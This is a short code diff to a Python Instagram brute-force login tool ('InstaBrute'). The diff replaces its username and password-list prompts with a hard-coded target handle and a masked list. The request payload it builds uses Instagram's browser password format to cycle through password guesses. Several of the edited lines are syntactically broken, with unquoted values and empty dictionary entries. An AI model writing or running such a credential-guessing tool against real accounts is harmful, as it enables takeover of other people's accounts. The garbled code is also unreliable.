@@ -42,8 +42,8 @@ class InstaBrute(object):
     def __init__(self):
 
         try:
-            user = input('username : ')
-            Combo = input('passList : ')
+            user = @allptuzcu
+            Combo = ***************
             print('\n----------------------------')
           
         except:
@@ -76,10 +76,10 @@ class InstaBrute(object):
         time = int(datetime.now().timestamp())
 
         payload = {
-            'username': user,
+            'username':@allptuzcu
             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
-            'queryParams': {},
-            'optIntoOneTap': 'false'
+            'queryParams': 
+            'optIntoOneTap':
         }
 
         with requests.Session() as s:
